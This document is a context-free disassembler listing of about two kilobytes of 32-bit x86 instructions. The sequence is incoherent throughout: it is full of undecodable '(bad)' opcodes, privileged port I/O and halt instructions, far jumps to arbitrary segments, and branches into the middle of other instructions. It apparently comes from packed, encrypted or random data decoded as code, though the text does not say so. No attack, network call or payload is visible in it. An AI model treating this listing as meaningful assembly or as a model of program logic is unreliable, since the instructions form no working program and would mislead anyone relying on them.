  411111:	cld    
  411112:	fcmovu st,st(0)
  411114:	enter  0xa6e8,0x45
  411118:	mov    esp,ss
  41111a:	das    
  41111b:	adc    ah,ah
  41111d:	inc    eax
  41111e:	pusha  
  41111f:	mov    cl,0xe3
  411121:	dec    ebx
  411122:	clc    
  411123:	push   0x3d1710e1
  411128:	shl    al,cl
  41112a:	mov    bh,0x66
  41112c:	hlt    
  41112d:	mov    dh,0xdc
  41112f:	(bad)  
  411130:	scas   al,BYTE PTR es:[edi]
  411131:	mov    bl,0x41
  411133:	dec    esi
  411134:	rcl    DWORD PTR [esi],cl
  411136:	pusha  
  411137:	fnstsw WORD PTR [ebx]
  411139:	stos   DWORD PTR es:[edi],eax
  41113a:	jo     0x41117d
  41113c:	fistp  DWORD PTR [ecx+edx*1-0x40]
  411140:	outs   dx,BYTE PTR ds:[esi]
  411141:	cmp    eax,esp
  411143:	or     BYTE PTR [ebx],bl
  411145:	mov    bh,0x9e
  411147:	je     0x411190
  411149:	loope  0x411105
  41114b:	psubsb mm6,QWORD PTR [edi+edi*4-0x6e]
  411150:	mov    ecx,0x35db3ada
  411155:	cli    
  411156:	mov    ch,0xd9
  411158:	push   0xffffff90
  41115a:	sti    
  41115b:	ds jno 0x411196
  41115e:	out    0xaa,al
  411160:	imul   ebp,esi,0xfe9eba3e
  411166:	adc    al,0xde
  411168:	out    dx,eax
  411169:	pop    ebx
  41116a:	mov    dl,0x93
  41116c:	push   ebp
  41116d:	push   ds
  41116e:	xchg   DWORD PTR [esi+0x2dc59485],ebx
  411174:	sar    DWORD PTR [edi+0x7cf78ab5],cl
  41117a:	xchg   DWORD PTR [eax],esi
  41117c:	fs or  al,0x5a
  41117f:	xchg   ebp,eax
  411180:	into   
  411181:	pop    edx
  411182:	and    al,0x97
  411184:	ja     0x411146
  411186:	pop    edx
  411187:	inc    ecx
  411188:	add    al,dl
  41118a:	(bad)
  41118d:	sar    BYTE PTR [ebx+0x24],cl
  411190:	test   eax,0xb0c04f1e
  411195:	mov    esi,0xa6addab8
  41119a:	or     eax,0x4f1c5b90
  41119f:	cmp    bh,dl
  4111a1:	js     0x411160
  4111a3:	push   ss
  4111a4:	mov    bl,BYTE PTR [edi]
  4111a6:	jno    0x41119c
  4111a8:	mov    esi,0xfc3144ec
  4111ad:	jns    0x41117a
  4111af:	sbb    eax,0x5c45bbf2
  4111b4:	push   edi
  4111b5:	sbb    ebp,DWORD PTR [eax-0x963c888]
  4111bb:	mov    edx,0x8c6f686c
  4111c0:	sbb    al,BYTE PTR [edi-0x4fd7cdb2]
  4111c6:	sbb    DWORD PTR [ecx-0x1e9c8903],edx
  4111cc:	mov    ebx,0xfccc85b4
  4111d1:	fwait
  4111d2:	sub    eax,0x7c0fe22c
  4111d7:	push   esp
  4111d8:	neg    esi
  4111da:	stos   DWORD PTR es:[edi],eax
  4111db:	push   cs
  4111dc:	and    ah,ch
  4111de:	mov    ah,0x4
  4111e0:	cmp    BYTE PTR [esi],dh
  4111e2:	xchg   edi,eax
  4111e3:	push   0xffffff92
  4111e5:	mov    al,ds:0x6ecb1fcc
  4111ea:	std    
  4111eb:	jmp    0x7916e280
  4111f0:	adc    ebx,DWORD PTR [ebp-0x700d241d]
  4111f6:	xchg   ecx,eax
  4111f7:	ins    DWORD PTR es:[edi],dx
  4111f8:	loope  0x4111d0
  4111fa:	into   
  4111fb:	sub    eax,0x11bec231
  411200:	or     WORD PTR ds:0xd49f4be4,cx
  411207:	in     al,0x12
  411209:	test   DWORD PTR [ebx-0x72c2ee40],esp
  41120f:	fwait
  411210:	(bad)  
  411211:	stos   BYTE PTR es:[edi],al
  411212:	xchg   cl,cl
  411214:	cmc    
  411215:	adc    al,0xd8
  411217:	lods   al,BYTE PTR ds:[esi]
  411218:	add    al,0xc1
  41121a:	aas    
  41121b:	cmp    al,0x36
  41121d:	xchg   ecx,eax
  41121e:	jns    0x411285
  411220:	mov    al,0x34
  411222:	loop   0x411257
  411224:	add    eax,0xb01d2d18
  411229:	fldcw  WORD PTR [ebp+0x49]
  41122c:	scas   eax,DWORD PTR es:[edi]
  41122d:	xchg   ebx,eax
  41122e:	or     WORD PTR [edi-0x10],si
  411232:	lods   eax,DWORD PTR ds:[esi]
  411233:	loopne 0x411248
  411235:	ja     0x411235
  411237:	cwde   
  411238:	cmp    al,0xd1
  41123a:	pop    edi
  41123b:	xchg   esp,eax
  41123c:	in     eax,dx
  41123d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41123e:	cmc    
  41123f:	outs   dx,DWORD PTR ds:[esi]
  411240:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411241:	cmp    dh,0xc1
  411244:	rcl    edi,cl
  411246:	scas   eax,DWORD PTR es:[edi]
  411247:	scas   eax,DWORD PTR es:[edi]
  411248:	jl     0x411256
  41124a:	lock push edx
  41124c:	add    dh,BYTE PTR [edx*2+0x7b2097c7]
  411253:	mov    edx,0x9deec47a
  411258:	jo     0x411296
  41125a:	or     al,0x46
  41125c:	jbe    0x411218
  41125e:	fimul  DWORD PTR [edi]
  411260:	clc    
  411261:	lock xchg edx,eax
  411263:	hlt    
  411264:	xor    cl,BYTE PTR [edi+0x1b5e7eb9]
  41126a:	cwde   
  41126b:	push   edi
  41126c:	xor    al,0x72
  41126e:	jbe    0x411241
  411270:	das    
  411271:	out    dx,al
  411272:	pop    ds
  411273:	les    edi,FWORD PTR [edx+0x169aa530]
  411279:	push   cs
  41127a:	lods   al,BYTE PTR ds:[esi]
  41127b:	sahf   
  41127c:	inc    ebp
  41127d:	ret    0xf4a0
  411280:	xchg   ebp,edi
  411282:	enter  0xd605,0xfd
  411286:	cmp    ah,BYTE PTR [eax+0x43d13d4a]
  41128c:	lods   al,BYTE PTR ds:[esi]
  41128d:	push   esp
  41128e:	in     al,0x45
  411290:	retf   0x9d8c
  411293:	out    0xe8,al
  411295:	imul   ebp,DWORD PTR [ebx-0x73],0xffffffb7
  411299:	cmp    al,0x3
  41129b:	xor    ah,BYTE PTR [eax]
  41129d:	push   0x51dcafb
  4112a2:	or     al,0x98
  4112a4:	mov    edi,0xc7e01b04
  4112a9:	pop    ecx
  4112aa:	scas   al,BYTE PTR es:[edi]
  4112ab:	aas    
  4112ac:	out    0x29,al
  4112ae:	cmp    eax,0x72683171
  4112b3:	or     edi,esp
  4112b5:	sub    BYTE PTR [eax+0x36],0x81
  4112b9:	cmc    
  4112ba:	popf   
  4112bb:	or     BYTE PTR ds:0x414090e8,al
  4112c1:	or     BYTE PTR [edx-0xb],ah
  4112c4:	pop    ecx
  4112c5:	ds int 0x64
  4112c8:	ins    BYTE PTR es:[edi],dx
  4112c9:	xchg   ecx,eax
  4112ca:	jne    0x41125f
  4112cc:	adc    al,0xca
  4112ce:	imul   ah
  4112d0:	outs   dx,DWORD PTR ds:[esi]
  4112d1:	dec    ecx
  4112d2:	push   esi
  4112d3:	fnstcw WORD PTR [edi]
  4112d5:	sub    al,0xd8
  4112d7:	(bad)  
  4112d8:	jge    0x411312
  4112da:	adc    al,0x66
  4112dc:	or     eax,0x3a85e2ca
  4112e1:	les    esp,FWORD PTR [edi-0x67cb2b6]
  4112e7:	or     cl,BYTE PTR [ebx+edi*2+0x32]
  4112eb:	adc    ebp,0xffffff8c
  4112ee:	loopne 0x411367
  4112f0:	popa   
  4112f1:	dec    edx
  4112f2:	sbb    ecx,DWORD PTR [edi]
  4112f4:	js     0x41130f
  4112f6:	mov    ss,WORD PTR ds:[edx+0xf0bf88b]
  4112fd:	mov    al,0xcf
  4112ff:	stos   BYTE PTR es:[edi],al
  411300:	adc    dl,BYTE PTR [edx+0x447bc2f5]
  411306:	sbb    BYTE PTR [eax+0x26],dl
  411309:	iret   
  41130a:	imul   ebx,esi,0x20
  41130d:	adc    eax,DWORD PTR [esp+eiz*4-0x48]
  411311:	adc    eax,0xafcbf5b3
  411316:	jb     0x411334
  411318:	sbb    ah,BYTE PTR [ebp+0x48]
  41131b:	mov    edx,0xb655c886
  411320:	ret    0x9789
  411323:	dec    ebx
  411324:	mov    edi,0x288fb563
  411329:	dec    edx
  41132a:	sahf   
  41132b:	push   eax
  41132c:	cmp    BYTE PTR [edx],ch
  41132e:	out    0xbd,al
  411330:	out    dx,al
  411331:	mov    ah,0xfa
  411333:	mov    ds:0x80b3f2a4,al
  411338:	mov    edx,ebp
  41133a:	test   al,0xd1
  41133c:	fmul   st,st(2)
  41133e:	ffree  st(5)
  411340:	pop    ebx
  411341:	pop    edi
  411342:	push   ebx
  411343:	mov    ecx,0xd102b0d0
  411348:	neg    dh
  41134a:	shr    DWORD PTR [edi+eax*8+0x54],0x7f
  41134f:	stos   DWORD PTR es:[edi],eax
  411350:	jb     0x4113ab
  411352:	or     bl,BYTE PTR [edi+ebp*2-0x17]
  411356:	mov    dh,BYTE PTR [eax-0x79]
  411359:	ss gs dec edi
  41135c:	ret    0xf331
  41135f:	arpl   cx,di
  411361:	adc    edi,ebp
  411363:	push   0xd23d1d85
  411368:	sub    esi,esp
  41136a:	ret    
  41136b:	and    eax,0x315e4b4d
  411370:	(bad)  
  411372:	pusha  
  411373:	sahf   
  411374:	mov    WORD PTR [eax],ds
  411376:	push   edi
  411377:	rcr    BYTE PTR [esi],1
  411379:	dec    ebp
  41137a:	mov    ecx,0xf99a7880
  41137f:	js     0x411321
  411381:	pop    edx
  411382:	jo     0x411388
  411384:	stc    
  411385:	iret   
  411386:	inc    edi
  411387:	aad    0x54
  411389:	mov    bl,0x24
  41138b:	cmp    DWORD PTR [ecx-0x7e],edi
  41138e:	ficom  WORD PTR [eax+0x4e]
  411391:	pop    eax
  411392:	scas   eax,DWORD PTR es:[edi]
  411393:	push   cs
  411394:	loope  0x4113bb
  411396:	cdq    
  411397:	push   edi
  411398:	retf   0xf3f5
  41139b:	sbb    eax,0xb326fda3
  4113a0:	shl    DWORD PTR [edi+0x55e934e5],1
  4113a6:	call   0xf102620f
  4113ab:	mov    edi,0xf8febd9a
  4113b0:	jecxz  0x41142c
  4113b2:	mov    esi,0x72751cd0
  4113b7:	call   0x9a17:0x48c0622a
  4113be:	jne    0x41141d
  4113c0:	ja     0x41134b
  4113c2:	mov    ds:0x33a898b5,al
  4113c7:	mov    bl,0xf5
  4113c9:	std    
  4113ca:	and    edx,DWORD PTR [eax+0x5e]
  4113cd:	sbb    DWORD PTR [ecx+0x75a45002],edi
  4113d3:	xchg   ecx,eax
  4113d4:	mov    edx,0xb58dffb6
  4113d9:	ss mov al,cl
  4113dc:	out    0xb2,al
  4113de:	xor    eax,0xd7a9427c
  4113e3:	push   cs
  4113e4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4113e5:	nop
  4113e6:	stos   BYTE PTR es:[edi],al
  4113e7:	pushf  
  4113e8:	push   eax
  4113e9:	sbb    al,0x45
  4113eb:	(bad)  
  4113ec:	dec    ebp
  4113ed:	shr    ch,cl
  4113ef:	pusha  
  4113f0:	xor    esp,edx
  4113f2:	into   
  4113f3:	or     BYTE PTR [eax+0x68ea28e0],al
  4113f9:	mov    ch,0x5b
  4113fb:	mov    edi,0xe605f3c4
  411400:	jg     0x411452
  411402:	cld    
  411403:	xchg   ebp,eax
  411404:	(bad)  
  411405:	push   ebp
  411406:	loope  0x411399
  411408:	aaa    
  411409:	adc    esp,0x108006d4
  41140f:	leave  
  411410:	cld    
  411411:	mul    bh
  411413:	test   al,0x4d
  411415:	ficomp DWORD PTR [ebx+0x35]
  411418:	(bad)  
  411419:	cwde   
  41141a:	inc    edx
  41141b:	into   
  41141c:	jmp    0x9240:0x7d43ea28
  411423:	and    BYTE PTR [edi],ch
  411425:	and    eax,0x667fe412
  41142a:	test   BYTE PTR [edi-0x1c],0x6c
  41142e:	adc    BYTE PTR [esp+eax*1-0x60],dl
  411432:	sub    al,BYTE PTR ds:0x2263fcf5
  411438:	adc    cl,BYTE PTR ds:[edx-0x26d4d584]
  41143f:	int    0x9f
  411441:	add    esp,DWORD PTR ds:0x6168db14
  411447:	xchg   ebp,eax
  411448:	stc    
  411449:	jb     0x4113cb
  41144b:	in     eax,dx
  41144c:	pop    ebp
  41144d:	sti    
  41144e:	jmp    0xc30f:0x63498922
  411455:	ins    BYTE PTR es:[edi],dx
  411456:	jb     0x41140f
  411458:	icebp  
  411459:	cmp    BYTE PTR [ecx-0x568f3df2],bl
  41145f:	mov    eax,ds:0x7c22178d
  411464:	clc    
  411465:	mov    eax,es
  411467:	cld    
  411468:	pushf  
  411469:	adc    ebp,DWORD PTR [esi+0x50]
  41146c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41146d:	cld    
  41146e:	jecxz  0x4114d9
  411470:	stos   DWORD PTR es:[edi],eax
  411471:	mov    esi,0x1f9728d4
  411476:	rcr    BYTE PTR [ecx-0x5368fde6],1
  41147c:	shr    BYTE PTR [eax],cl
  41147e:	mov    ch,0xee
  411481:	pop    ebx
  411482:	test   al,0x70
  411484:	ss jl  0x411453
  411487:	outs   dx,BYTE PTR ds:[esi]
  411488:	cmp    eax,edx
  41148a:	mov    edi,0x4fc60527
  41148f:	mov    edi,0xbe7ec0d2
  411494:	cmps   BYTE PTR ss:[esi],BYTE PTR es:[edi]
  411496:	lock ins BYTE PTR es:[edi],dx
  411498:	mov    eax,ds:0x9bd48827
  41149d:	cmp    BYTE PTR [ecx-0xa],dl
  4114a0:	cmp    al,0x82
  4114a2:	inc    edx
  4114a3:	dec    ecx
  4114a4:	jne    0x41146d
  4114a6:	cmp    eax,0x72a7a1e7
  4114ab:	(bad)  
  4114ad:	inc    ebp
  4114ae:	pop    ebx
  4114af:	push   es
  4114b0:	bound  bx,DWORD PTR [eax+ebp*2-0x2d]
  4114b5:	adc    DWORD PTR [ebp+0x48bb253e],ebx
  4114bb:	fwait
  4114bc:	ret    
  4114bd:	rol    BYTE PTR [ecx+0xa42394],cl
  4114c3:	sub    edi,DWORD PTR [edi]
  4114c5:	imul   ebp,edi,0x1a
  4114c8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4114c9:	bswap  edx
  4114cb:	sub    ebx,DWORD PTR [ebx-0x6133b443]
  4114d1:	mov    DWORD PTR [ebx+0x73],ebp
  4114d4:	mov    dh,0x3b
  4114d6:	ds push esp
  4114d8:	sub    dl,BYTE PTR [esi+0x43]
  4114db:	retf   
  4114dc:	and    ebx,DWORD PTR [esi-0x2b]
  4114df:	je     0x41146a
  4114e1:	and    DWORD PTR [edx+0x14],0x52
  4114e5:	inc    ecx
  4114e6:	rcl    DWORD PTR [esi+edi*1],1
  4114e9:	or     DWORD PTR ds:0x6abbb2ce,0xdbb2cd52
  4114f3:	inc    edx
  4114f4:	retfw  0x418e
  4114f8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4114f9:	inc    ecx
  4114fa:	add    eax,0x16bfcef4
  4114ff:	je     0x41157d
  411501:	push   ds
  411502:	inc    eax
  411503:	jo     0x411524
  411505:	sbb    al,0xe1
  411507:	loop   0x4114e6
  411509:	pusha  
  41150a:	pop    ebp
  41150b:	xchg   edx,eax
  41150c:	xchg   edi,eax
  41150d:	sbb    eax,eax
  41150f:	imul   esi,DWORD PTR [edi],0xbc72075a
  411515:	test   al,0x4d
  411517:	jbe    0x4114a1
  411519:	jne    0x41156d
  41151b:	jb     0x4114d1
  41151d:	ins    DWORD PTR es:[edi],dx
  41151e:	nop
  41151f:	inc    ebp
  411520:	and    DWORD PTR [edx*1-0x9a3de4a],0xeb327084
  41152b:	push   0x1d
  41152d:	sbb    BYTE PTR [ebx],ah
  41152f:	shl    DWORD PTR [esi],0x19
  411532:	lock loopne 0x4114dd
  411535:	scas   eax,DWORD PTR es:[edi]
  411536:	pop    ds
  411537:	sub    esi,DWORD PTR cs:[eax]
  41153a:	mov    ebx,0x247f6d45
  41153f:	inc    esp
  411540:	hlt    
  411541:	and    ecx,ebx
  411543:	fwait
  411544:	pop    es
  411545:	ins    BYTE PTR es:[edi],dx
  411546:	mov    bl,0x35
  411548:	push   0x482b1c83
  41154d:	call   0xec3372f7
  411552:	add    ebp,DWORD PTR [eax-0x3baf2aba]
  411558:	cwde   
  411559:	clc    
  41155a:	lahf   
  41155b:	jle    0x41158c
  41155d:	dec    ebx
  41155e:	bswap  esp
  411560:	cwde   
  411561:	mov    esi,esp
  411563:	xor    al,BYTE PTR [eax+edx*8]
  411566:	and    al,bl
  411568:	adc    dl,BYTE PTR [eax+0x10]
  41156b:	loopne 0x41154c
  41156d:	pop    eax
  41156e:	add    al,0x62
  411570:	or     edx,ebp
  411572:	or     eax,0x941d3d1a
  411577:	sbb    BYTE PTR [ecx+0xf],ch
  41157a:	ins    DWORD PTR es:[edi],dx
  41157b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41157c:	inc    eax
  41157d:	jg     0x41150d
  41157f:	rol    BYTE PTR [edx],1
  411581:	es pop edi
  411583:	cmc    
  411584:	mov    edx,0x5bf71adf
  411589:	push   esp
  41158a:	fistp  QWORD PTR [eax+0x51]
  41158d:	ja     0x41159b
  41158f:	in     eax,dx
  411590:	rep ins DWORD PTR es:[edi],dx
  411592:	xchg   ecx,eax
  411593:	inc    ebp
  411594:	aas    
  411595:	jmp    0xafc8:0xbce3b6f4
  41159c:	push   eax
  41159d:	xor    al,0xfa
  41159f:	xchg   BYTE PTR [edi+0x13c41a4c],ah
  4115a5:	inc    esp
  4115a6:	fisttp DWORD PTR [edx]
  4115a8:	push   ebx
  4115a9:	and    DWORD PTR [esi+ecx*8-0x46],edi
  4115ad:	mov    ds:0x5dbfbfd5,eax
  4115b2:	sub    eax,DWORD PTR [eax+0x10]
  4115b5:	dec    eax
  4115b6:	outs   dx,BYTE PTR ds:[esi]
  4115b7:	pop    es
  4115b8:	dec    ebx
  4115b9:	retf   0x7185
  4115bc:	fcomp  DWORD PTR [ebp+0x13]
  4115bf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4115c0:	jmp    0x411637
  4115c2:	mov    ah,0x50
  4115c4:	sbb    bl,BYTE PTR [eax+0x40]
  4115c7:	shl    esi,0x6e
  4115ca:	xchg   ebx,eax
  4115cb:	jnp    0x411577
  4115cd:	ret    0x8d81
  4115d0:	and    BYTE PTR [esi],cl
  4115d2:	icebp  
  4115d3:	mov    eax,ds:0x445cfcf1
  4115d8:	add    DWORD PTR [ecx+0x6d],ebp
  4115db:	iret   
  4115dc:	xchg   edi,eax
  4115dd:	cmp    al,0x11
  4115df:	ins    DWORD PTR es:[edi],dx
  4115e0:	cs mov ch,0xca
  4115e3:	adc    ecx,DWORD PTR [edx]
  4115e5:	push   ss
  4115e6:	shl    DWORD PTR [ebx+0x800a353],1
  4115ec:	out    0x85,ax
  4115ef:	call   0xd5326750
  4115f4:	outs   dx,DWORD PTR ds:[esi]
  4115f5:	xchg   ebp,eax
  4115f6:	fwait
  4115f7:	push   esi
  4115f8:	jl     0x4115be
  4115fa:	sar    DWORD PTR [esi+0x63],cl
  4115fd:	cmp    DWORD PTR [edx+eax*8-0x460e154d],esi
  411604:	sub    esp,esi
  411606:	xchg   DWORD PTR [edi-0x56358e29],ecx
  41160c:	jmp    0xd37c1d32
  411611:	(bad)  
  411612:	ror    edx,1
  411614:	pop    ebp
  411615:	mov    ah,0xb2
  411617:	rcl    BYTE PTR [eiz*1+0x355c4203],0x91
  41161f:	dec    edx
  411620:	or     DWORD PTR [eax-0x57],0xffffffad
  411624:	lahf   
  411625:	inc    esi
  411626:	fnstcw WORD PTR ds:0xdeb18325
  41162c:	sahf   
  41162d:	inc    esp
  41162e:	jns    0x41166c
  411630:	inc    ecx
  411631:	dec    BYTE PTR [edi+eiz*2]
  411634:	call   0x35d6:0x1c07981d
  41163b:	test   eax,0x770cec44
  411640:	fs gs ret 
  411643:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411644:	lods   eax,DWORD PTR ds:[esi]
  411645:	pop    esi
  411646:	out    dx,al
  411647:	int3   
  411648:	inc    ecx
  411649:	or     ebp,DWORD PTR gs:[edi+0x35ef4df9]
  411650:	cld    
  411651:	inc    edi
  411652:	mov    ecx,DWORD PTR [ebx+eax*8+0x36c2c2b]
  411659:	jmp    0x83754256
  41165e:	stos   BYTE PTR es:[edi],al
  41165f:	je     0x4116b9
  411661:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411662:	sbb    ebx,ecx
  411664:	mov    bl,0xc5
  411666:	mov    cl,0x1e
  411668:	fistp  DWORD PTR [edx-0x4cd358d9]
  41166e:	add    edi,DWORD PTR [ebx+0x35]
  411671:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411672:	fcomp  DWORD PTR [edi-0x3]
  411675:	jno    0x4116f1
  411677:	and    BYTE PTR [ecx-0x75],cl
  41167a:	xchg   esp,eax
  41167b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41167c:	xor    bh,BYTE PTR [ebx]
  41167e:	add    al,0xe4
  411680:	into   
  411681:	pminub mm0,QWORD PTR [ecx]
  411684:	call   DWORD PTR [edi+0x7c]
  411687:	imul   edi,DWORD PTR ds:0xa155484,0x64
  41168e:	pop    edi
  41168f:	js     0x41170a
  411691:	(bad)  
  411692:	cmp    eax,0x8635d39a
  411697:	mov    al,ds:0xfe9b00d3
  41169c:	in     eax,dx
  41169d:	mov    dh,0xf4
  41169f:	sbb    esp,DWORD PTR [ecx]
  4116a1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4116a2:	mov    ebp,0x8253ebdc
  4116a7:	mov    al,ds:0x968c1c69
  4116ac:	cwde   
  4116ad:	ins    BYTE PTR es:[edi],dx
  4116ae:	mov    ds:0xc065022c,al
  4116b3:	(bad)  
  4116b4:	rol    BYTE PTR [eax+0x64465b5d],cl
  4116ba:	int    0xa2
  4116bc:	ret    0x6c0e
  4116bf:	pop    ecx
  4116c0:	out    dx,eax
  4116c1:	div    cl
  4116c3:	mov    ds:0xd8eee683,al
  4116c8:	mov    esp,ebx
  4116ca:	mov    al,BYTE PTR [edx-0x1ee3771e]
  4116d0:	fcmovne st,st(2)
  4116d2:	inc    ecx
  4116d3:	gs stos DWORD PTR es:[edi],eax
  4116d5:	mov    ebp,0x92c18319
  4116da:	mov    dh,0xc2
  4116dc:	inc    edi
  4116dd:	inc    esp
  4116de:	xor    bh,BYTE PTR [esi]
  4116e0:	push   edi
  4116e1:	sbb    BYTE PTR [edi+ebx*2-0x52],0x4a
  4116e6:	mov    edx,0xdb43e2ed
  4116eb:	je     0x411719
  4116ed:	fs jmp 0x4116fd
  4116f0:	xchg   ebp,eax
  4116f1:	shl    DWORD PTR [ebx+esi*1],1
  4116f4:	adc    esi,DWORD PTR ds:0xaddd464e
  4116fa:	ror    DWORD PTR [ebx-0x43],cl
  4116fd:	adc    bl,BYTE PTR [edi+0x3a7d3407]
  411703:	xor    al,0x56
  411705:	push   0x47770da2
  41170a:	add    al,0x42
  41170c:	push   ecx
  41170d:	(bad)  
  41170e:	int    0xe5
  411710:	inc    edi
  411711:	adc    BYTE PTR [eax-0x4de29290],al
  411717:	aas    
  411718:	pop    ss
  411719:	imul   ebx,DWORD PTR [edi+0x7de6a6de],0xffffff9c
  411720:	pop    es
  411721:	test   BYTE PTR [ecx+0x5bdf14db],0xd0
  411728:	mov    DWORD PTR [esi-0x5d],0x26645289
  41172f:	adc    BYTE PTR ss:[edi+0x558bf181],0x33
  411737:	fisttp DWORD PTR [edx-0x5c121cc9]
  41173d:	xor    ah,BYTE PTR [edx]
  41173f:	dec    esi
  411740:	(bad)
  411744:	pop    esp
  411745:	xchg   DWORD PTR [ebx],edi
  411747:	cli    
  411748:	pop    esp
  411749:	ds mov dl,0x8f
  41174c:	and    esp,eax
  41174e:	cmp    eax,0xd048cf83
  411753:	retf   
  411754:	push   es
  411755:	in     al,0xf2
  411757:	in     eax,dx
  411758:	push   cs
  411759:	mov    ds:0x7d6ee890,al
  41175e:	in     al,dx
  41175f:	jmp    0x41172e
  411761:	cmp    bl,dl
  411763:	shr    edi,cl
  411765:	mov    ?,WORD PTR [edx+0x2]
  411768:	rol    BYTE PTR [esi],0xc1
  41176b:	loope  0x411701
  41176d:	pop    ss
  41176e:	imul   ebp,ecx,0xffffffd9
  411771:	sbb    BYTE PTR [edi+0x700c9f0f],dh
  411777:	arpl   WORD PTR [edi],ax
  411779:	dec    edx
  41177a:	sub    BYTE PTR [eax+0x1bd54f90],bh
  411780:	jmp    0x411761
  411782:	mov    ch,0x75
  411784:	add    bl,BYTE PTR [eax+0x667194e5]
  41178a:	xchg   ecx,eax
  41178b:	leave  
  41178c:	adc    BYTE PTR [ecx],0x3f
  41178f:	pop    edi
  411790:	push   0x2f
  411792:	add    eax,0x255b4082
  411797:	in     al,dx
  411798:	push   cs
  411799:	push   ebp
  41179a:	sbb    ebx,ebp
  41179c:	rcl    ebx,0xcd
  41179f:	lahf   
  4117a0:	call   0xea51:0x97bafbe3
  4117a7:	add    bl,0xf7
  4117aa:	imul   eax,DWORD PTR [ecx+0x63d1ec52],0xffffffeb
  4117b1:	dec    eax
  4117b2:	mov    esi,0x27efbcd3
  4117b7:	add    ch,BYTE PTR [esi-0xf88acbf]
  4117bd:	repnz xor DWORD PTR [esi+esi*2],ebx
  4117c1:	ss sub al,0x91
  4117c4:	jecxz  0x411801
  4117c6:	xchg   esi,eax
  4117c7:	push   cs
  4117c8:	cmp    ah,BYTE PTR [edx+0x28]
  4117cb:	out    0x3,eax
  4117cd:	je     0x4117b4
  4117cf:	pop    ds
  4117d0:	adc    esi,eax
  4117d2:	scas   eax,DWORD PTR es:[edi]
  4117d3:	das    
  4117d4:	stos   BYTE PTR es:[edi],al
  4117d5:	and    DWORD PTR [edi+0xc],ebx
  4117d8:	rcr    BYTE PTR [ebp+0x27],0xec
  4117dc:	fucomi st,st(4)
  4117de:	pop    ebx
  4117df:	aad    0x25
  4117e1:	ret    
  4117e2:	std    
  4117e3:	jmp    0x178d682b
  4117e8:	fidiv  WORD PTR [edi]
  4117ea:	or     BYTE PTR gs:[edi+0x38293369],dh
  4117f1:	dec    ebx
  4117f2:	inc    ebp
  4117f3:	leave  
  4117f4:	cmc    
  4117f5:	push   ss
  4117f6:	int3   
  4117f7:	ret    0xe06
  4117fa:	lahf   
  4117fb:	pushw  0xf945
  4117ff:	(bad)  
  411800:	fidivr DWORD PTR [esi+eiz*8-0x1e]
  411804:	(bad)  
  411805:	repnz (bad) 
  411808:	rol    BYTE PTR [eax+edx*1],1
  41180b:	je     0x4117da
  41180d:	(bad)  
  41180e:	mov    eax,ds:0xecdf768
  411813:	(bad)  
  411814:	ja     0x41186c
  411816:	xchg   ebx,eax
  411817:	aas    
  411818:	stos   BYTE PTR es:[edi],al
  411819:	xor    ebx,DWORD PTR [ecx]
  41181b:	mov    esp,edx
  41181d:	loop   0x4117e1
  41181f:	mov    DWORD PTR [edx+eax*1-0x3d],esi
  411823:	int    0x8e
  411825:	fcmovnb st,st(1)
  411827:	(bad)  
  411828:	stc    
  411829:	fs mov edx,0x5d37fe6f
  41182f:	mov    dl,0x9f
  411831:	mov    edx,0xaa13d6af
  411836:	call   0xc40b0c42
  41183b:	ret    0x3042
  41183e:	getsec 
  411840:	aam    0xba
  411842:	jnp    0x411803
  411844:	lods   eax,DWORD PTR ds:[esi]
  411845:	ret    
  411846:	iret   
  411847:	test   al,0x5f
  411849:	xchg   BYTE PTR [ebp+0x2b5956ca],dh
  41184f:	outs   dx,BYTE PTR ds:[esi]
  411850:	(bad)  
  411851:	ja     0x411801
  411853:	push   esi
  411854:	push   eax
  411855:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411856:	dec    ecx
  411857:	ja     0x4117dd
  411859:	adc    ah,bh
  41185b:	jns    0x411852
  41185d:	jmp    DWORD PTR [ebp-0x1a]
  411860:	mov    ecx,0xc23d0be1
  411865:	cld    
  411866:	mov    ?,WORD PTR [edi]
  411868:	dec    esi
  411869:	sub    ecx,ecx
  41186b:	scas   al,BYTE PTR es:[edi]
  41186c:	add    cl,BYTE PTR [eax]
  41186e:	jmp    0x37cd:0xbef180af
  411875:	repnz movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411877:	outs   dx,BYTE PTR ds:[esi]
  411878:	fisub  WORD PTR [ebx+0x2b]
  41187b:	push   edi
  41187c:	retf   
  41187d:	out    dx,eax
  41187e:	mov    edx,DWORD PTR [edi-0x52]
  411881:	call   0x19d6:0x62b0567a
  411888:	ror    DWORD PTR [ebp+0x2e],1
  41188b:	enter  0xa81b,0x2f
  41188f:	jno    0x411873
  411891:	adc    al,BYTE PTR [ebx+0x1a]
  411894:	cmc    
  411895:	cmp    DWORD PTR [eax-0x67],ebx
  411898:	push   ebp
  411899:	int3   
  41189a:	mov    esi,0xf70da0a
  41189f:	dec    ebx
  4118a0:	call   0x5d1b:0x4ad02edc
  4118a7:	dec    esi
  4118a8:	adc    DWORD PTR [ecx+0x23],edi
  4118ab:	cdq    
  4118ac:	ja     0x41185c
  4118ae:	popa   
  4118af:	push   ss
  4118b0:	js     0x411860
  4118b2:	shr    cx,cl
  4118b5:	iret   
  4118b6:	jno    0x4118d1
  4118b8:	js     0x4118c3
  4118ba:	xor    DWORD PTR [ecx],ecx
  4118bc:	mov    ah,dh
  4118be:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4118bf:	out    0xfb,al
  4118c1:	add    al,0xcf
  4118c3:	adc    DWORD PTR [edx-0x1d],eax
  4118c6:	scas   eax,DWORD PTR es:[edi]
  4118c7:	add    ebx,edx
  4118c9:	jnp    0x41193e
  4118cb:	adc    ebp,DWORD PTR [edi+ebx*4-0xf1d299c]
  4118d2:	out    dx,al
  4118d3:	aaa    
